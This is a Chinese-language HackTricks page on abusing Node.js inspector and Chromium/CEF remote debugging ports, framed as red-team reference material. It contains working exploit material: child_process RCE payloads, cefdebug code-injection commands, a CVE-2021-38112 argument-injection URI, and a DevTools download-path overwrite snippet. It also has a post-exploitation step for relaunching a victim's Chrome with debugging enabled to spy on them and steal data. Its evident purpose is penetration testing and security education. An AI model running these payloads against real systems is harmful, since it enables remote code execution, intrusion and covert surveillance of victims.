# Node inspector/CEF debug abuse

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

[从文档中获取](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): 当使用`--inspect`开关启动时，Node.js进程会监听调试客户端。**默认情况下**，它会在主机和端口**`127.0.0.1:9229`**上进行监听。每个进程还会被分配一个**唯一的UUID**。

检查器客户端必须知道并指定主机地址、端口和UUID才能连接。完整的URL看起来像`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。

{% hint style="warning" %}
由于**调试器可以完全访问Node.js执行环境**，一个恶意行为者能够连接到这个端口，可能能够代表Node.js进程执行任意代码（**潜在的权限提升**）。
{% endhint %}

有几种启动检查器的方式：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
当您启动一个被检查的进程时，会出现类似以下内容：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
基于**CEF**（**Chromium嵌入式框架**）的进程需要使用参数：`--remote-debugging-port=9222`来打开**调试器**（SSRF保护保持非常相似）。然而，它们不会授予一个**NodeJS** **调试**会话，而是使用[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)与浏览器通信，这是一个控制浏览器的接口，但没有直接的RCE。

当您启动一个被调试的浏览器时，会出现类似以下内容：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### 浏览器、WebSockets 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在 Web 浏览器中打开的网站可以在浏览器安全模型下进行 WebSocket 和 HTTP 请求。**初始 HTTP 连接**是必要的，以**获取唯一的调试器会话 ID**。**同源策略** **阻止**网站能够进行**此 HTTP 连接**。为了进一步防范[**DNS 重绑定攻击**](https://en.wikipedia.org/wiki/DNS\_rebinding)**，**Node.js 验证连接的**'Host' 标头**是否明确指定了**IP 地址**或**`localhost`**或**`localhost6`**。

{% hint style="info" %}
这些**安全措施防止利用检查器**通过**仅发送 HTTP 请求**来运行代码（这可以利用 SSRF 漏洞来完成）。
{% endhint %}

### 在运行中的进程中启动检查器

您可以向运行中的 nodejs 进程发送**信号 SIGUSR1**，使其**在默认端口启动检查器**。但是，请注意您需要具有足够的特权，因此这可能会授予您**访问进程内部信息的特权**，但不会直接提升特权。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
这在容器中非常有用，因为使用 `--inspect` 关闭进程并启动一个新进程**不是一个选择**，因为**容器**将随着进程被**终止**。
{% endhint %}

### 连接到检查器/调试器

要连接到基于**Chromium的浏览器**，可以访问 `chrome://inspect` 或 `edge://inspect` URL 以分别针对 Chrome 或 Edge。通过单击配置按钮，应确保**目标主机和端口**已正确列出。下图显示了一个远程代码执行（RCE）示例：

![](<../../.gitbook/assets/image (620) (1).png>)

使用**命令行**可以连接到调试器/检查器：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
该工具[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)允许**查找**本地运行的**检查器**并**注入代码**进入其中。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
请注意，如果通过[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)连接到浏览器，**NodeJS RCE exploits**将无法运行（您需要检查API以找到有趣的操作）。
{% endhint %}

## NodeJS调试器/检查器中的RCE

{% hint style="info" %}
如果您是来这里查找如何从Electron中的XSS获取[**RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

一些常见的获得**RCE**的方法是当您可以**连接**到Node **检查器**时使用类似以下内容（看起来这在连接到Chrome DevTools协议时**不起作用**）：
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

您可以在此处查看API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
在本节中，我将列出我发现的人们用来利用此协议的有趣内容。

### 通过深度链接进行参数注入

在[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)中，犀牛安全发现基于CEF的应用程序在系统中注册了一个自定义URI（workspaces://），该URI接收完整的URI，然后使用部分构建自该URI的配置来启动基于CEF的应用程序。

发现URI参数被URL解码并用于启动CEF基本应用程序，允许用户在**命令行**中**注入**标志**`--gpu-launcher`**并执行任意操作。

因此，一个类似的有效负载：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### 覆盖文件

更改**下载文件保存位置**的文件夹，并下载一个文件，用你的**恶意代码**覆盖应用程序经常使用的**源代码**。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE and exfiltration

根据这篇文章: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) 可以获得RCE并从theriver中泄露内部页面。

### 后渗透

在真实环境中，**在入侵了使用Chrome/Chromium浏览器的用户PC后**，您可以启动一个带有**调试功能并进行端口转发的Chrome进程**，以便访问它。这样，您将能够**检查受害者在Chrome中的所有操作并窃取敏感信息**。

隐秘的方法是**终止每个Chrome进程**，然后调用类似以下内容:
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考资料

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。 

</details>
